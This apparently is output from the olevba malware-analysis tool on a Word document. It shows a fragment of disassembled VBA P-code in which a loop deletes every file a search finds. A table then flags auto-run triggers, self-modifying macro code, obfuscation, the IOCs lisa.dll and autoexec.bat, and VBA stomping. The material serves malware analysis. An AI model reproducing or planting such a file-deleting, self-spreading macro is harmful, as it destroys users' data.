' 	IfBlock 
' Line #134:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #135:
' 	Ld y 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #136:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	EndWith 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	EndWith 
' Line #142:
' 	EndSub 
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' Line #259:
' Line #260:
' Line #261:
' Line #262:
' Line #263:
' Line #264:
' Line #265:
' Line #266:
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' Line #274:
' Line #275:
' Line #276:
' Line #277:
' Line #278:
' Line #279:
' Line #280:
' Line #281:
' Line #282:
' Line #283:
' Line #284:
' Line #285:
' Line #286:
' Line #287:
' Line #288:
' Line #289:
' Line #290:
' Line #291:
' Line #292:
' Line #293:
' Line #294:
' Line #295:
' Line #296:
' Line #297:
' Line #298:
' Line #299:
' Line #300:
' Line #301:
' Line #302:
' Line #303:
' Line #304:
' Line #305:
' Line #306:
' Line #307:
' Line #308:
' Line #309:
' Line #310:
' Line #311:
' Line #312:
' Line #313:
' Line #314:
' Line #315:
' Line #316:
' Line #317:
' Line #318:
' Line #319:
' Line #320:
' Line #321:
' Line #322:
' Line #323:
' Line #324:
' Line #325:
' Line #326:
' Line #327:
' Line #328:
' Line #329:
' Line #330:
' Line #331:
' Line #332:
' Line #333:
' Line #334:
' Line #335:
' Line #336:
' Line #337:
' Line #338:
' Line #339:
' Line #340:
' Line #341:
' Line #342:
' Line #343:
' Line #344:
' Line #345:
' Line #346:
' Line #347:
' Line #348:
' Line #349:
' Line #350:
' Line #351:
' Line #352:
' Line #353:
' Line #354:
' Line #355:
' Line #356:
' Line #357:
' Line #358:
' Line #359:
' Line #360:
' Line #361:
' Line #362:
' Line #363:
' Line #364:
' Line #365:
' Line #366:
' Line #367:
' Line #368:
' Line #369:
' Line #370:
' Line #371:
' Line #372:
' Line #373:
' Line #374:
' Line #375:
' Line #376:
' Line #377:
' Line #378:
' Line #379:
' Line #380:
' Line #381:
' Line #382:
' Line #383:
' Line #384:
' Line #385:
' Line #386:
' Line #387:
' Line #388:
' Line #389:
' Line #390:
' Line #391:
' Line #392:
' Line #393:
' Line #394:
' Line #395:
' Line #396:
' Line #397:
' Line #398:
' Line #399:
' Line #400:
' Line #401:
' Line #402:
' Line #403:
' Line #404:
' Line #405:
' Line #406:
' Line #407:
' Line #408:
' Line #409:
' Line #410:
' Line #411:
' Line #412:
' Line #413:
' Line #414:
' Line #415:
' Line #416:
' Line #417:
' Line #418:
' Line #419:
' Line #420:
' Line #421:
' Line #422:
' Line #423:
' Line #424:
' Line #425:
' Line #426:
' Line #427:
' Line #428:
' Line #429:
' Line #430:
' Line #431:
' Line #432:
' Line #433:
' Line #434:
' Line #435:
' Line #436:
' Line #437:
' Line #438:
' Line #439:
' Line #440:
' Line #441:
' Line #442:
' Line #443:
' Line #444:
' Line #445:
' Line #446:
' Line #447:
' Line #448:
' Line #449:
' Line #450:
' Line #451:
' Line #452:
' Line #453:
' Line #454:
' Line #455:
' Line #456:
' Line #457:
' Line #458:
' Line #459:
' Line #460:
' Line #461:
' Line #462:
' Line #463:
' Line #464:
' Line #465:
' Line #466:
' Line #467:
' Line #468:
' Line #469:
' Line #470:
' Line #471:
' Line #472:
' Line #473:
' Line #474:
' Line #475:
' Line #476:
' Line #477:
' Line #478:
' Line #479:
' Line #480:
' Line #481:
' Line #482:
' Line #483:
' Line #484:
' Line #485:
' Line #486:
' Line #487:
' Line #488:
' Line #489:
' Line #490:
' Line #491:
' Line #492:
' Line #493:
' Line #494:
' Line #495:
' Line #496:
' Line #497:
' Line #498:
' Line #499:
' Line #500:
' Line #501:
' Line #502:
' Line #503:
' Line #504:
' Line #505:
' Line #506:
' Line #507:
' Line #508:
' Line #509:
' Line #510:
' Line #511:
' Line #512:
' Line #513:
' Line #514:
' Line #515:
' Line #516:
' Line #517:
' Line #518:
' Line #519:
' Line #520:
' Line #521:
' Line #522:
' Line #523:
' Line #524:
' Line #525:
' Line #526:
' Line #527:
' Line #528:
' Line #529:
' Line #530:
' Line #531:
' Line #532:
' Line #533:
' Line #534:
' Line #535:
' Line #536:
' Line #537:
' Line #538:
' Line #539:
' Line #540:
' Line #541:
' Line #542:
' Line #543:
' Line #544:
' Line #545:
' Line #546:
' Line #547:
' Line #548:
' Line #549:
' Line #550:
' Line #551:
' Line #552:
' Line #553:
' Line #554:
' Line #555:
' Line #556:
' Line #557:
' Line #558:
' Line #559:
' Line #560:
' Line #561:
' Line #562:
' Line #563:
' Line #564:
' Line #565:
' Line #566:
' Line #567:
' Line #568:
' Line #569:
' Line #570:
' Line #571:
' Line #572:
' Line #573:
' Line #574:
' Line #575:
' Line #576:
' Line #577:
' Line #578:
' Line #579:
' Line #580:
' Line #581:
' Line #582:
' Line #583:
' Line #584:
' Line #585:
' Line #586:
' Line #587:
' Line #588:
' Line #589:
' Line #590:
' Line #591:
' Line #592:
' Line #593:
' Line #594:
' Line #595:
' Line #596:
' Line #597:
' Line #598:
' Line #599:
' Line #600:
' Line #601:
' Line #602:
' Line #603:
' Line #604:
' Line #605:
' Line #606:
' Line #607:
' Line #608:
' Line #609:
' Line #610:
' Line #611:
' Line #612:
' Line #613:
' Line #614:
' Line #615:
' Line #616:
' Line #617:
' Line #618:
' Line #619:
' Line #620:
' Line #621:
' Line #622:
' Line #623:
' Line #624:
' Line #625:
' Line #626:
' Line #627:
' Line #628:
' Line #629:
' Line #630:
' Line #631:
' Line #632:
' Line #633:
' Line #634:
' Line #635:
' Line #636:
' Line #637:
' Line #638:
' Line #639:
' Line #640:
' Line #641:
' Line #642:
' Line #643:
' Line #644:
' Line #645:
' Line #646:
' Line #647:
' Line #648:
' Line #649:
' Line #650:
' Line #651:
' Line #652:
' Line #653:
' Line #654:
' Line #655:
' Line #656:
' Line #657:
' Line #658:
' Line #659:
' Line #660:
' Line #661:
' Line #662:
' Line #663:
' Line #664:
' Line #665:
' Line #666:
' Line #667:
' Line #668:
' Line #669:
' Line #670:
' Line #671:
' Line #672:
' Line #673:
' Line #674:
' Line #675:
' Line #676:
' Line #677:
' Line #678:
' Line #679:
' Line #680:
' Line #681:
' Line #682:
' Line #683:
' Line #684:
' Line #685:
' Line #686:
' Line #687:
' Line #688:
' Line #689:
' Line #690:
' Line #691:
' Line #692:
' Line #693:
' Line #694:
' Line #695:
' Line #696:
' Line #697:
' Line #698:
' Line #699:
' Line #700:
' Line #701:
' Line #702:
' Line #703:
' Line #704:
' Line #705:
' Line #706:
' Line #707:
' Line #708:
' Line #709:
' Line #710:
' Line #711:
' Line #712:
' Line #713:
' Line #714:
' Line #715:
' Line #716:
' Line #717:
' Line #718:
' Line #719:
' Line #720:
' Line #721:
' Line #722:
' Line #723:
' Line #724:
' Line #725:
' Line #726:
' Line #727:
' Line #728:
' Line #729:
' Line #730:
' Line #731:
' Line #732:
' Line #733:
' Line #734:
' Line #735:
' Line #736:
' Line #737:
' Line #738:
' Line #739:
' Line #740:
' Line #741:
' Line #742:
' Line #743:
' Line #744:
' Line #745:
' Line #746:
' Line #747:
' Line #748:
' Line #749:
' Line #750:
' Line #751:
' Line #752:
' Line #753:
' Line #754:
' Line #755:
' Line #756:
' Line #757:
' Line #758:
' Line #759:
' Line #760:
' Line #761:
' Line #762:
' Line #763:
' Line #764:
' Line #765:
' Line #766:
' Line #767:
' Line #768:
' Line #769:
' Line #770:
' Line #771:
' Line #772:
' Line #773:
' Line #774:
' Line #775:
' Line #776:
' Line #777:
' Line #778:
' Line #779:
' Line #780:
' Line #781:
' Line #782:
' Line #783:
' Line #784:
' Line #785:
' Line #786:
' Line #787:
' Line #788:
' Line #789:
' Line #790:
' Line #791:
' Line #792:
' Line #793:
' Line #794:
' Line #795:
' Line #796:
' Line #797:
' Line #798:
' Line #799:
' Line #800:
' Line #801:
' Line #802:
' Line #803:
' Line #804:
' Line #805:
' Line #806:
' Line #807:
' Line #808:
' Line #809:
' Line #810:
' Line #811:
' Line #812:
' Line #813:
' Line #814:
' Line #815:
' Line #816:
' Line #817:
' Line #818:
' Line #819:
' Line #820:
' Line #821:
' Line #822:
' Line #823:
' Line #824:
' Line #825:
' Line #826:
' Line #827:
' Line #828:
' Line #829:
' Line #830:
' Line #831:
' Line #832:
' Line #833:
' Line #834:
' Line #835:
' Line #836:
' Line #837:
' Line #838:
' Line #839:
' Line #840:
' Line #841:
' Line #842:
' Line #843:
' Line #844:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lisa.dll            |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

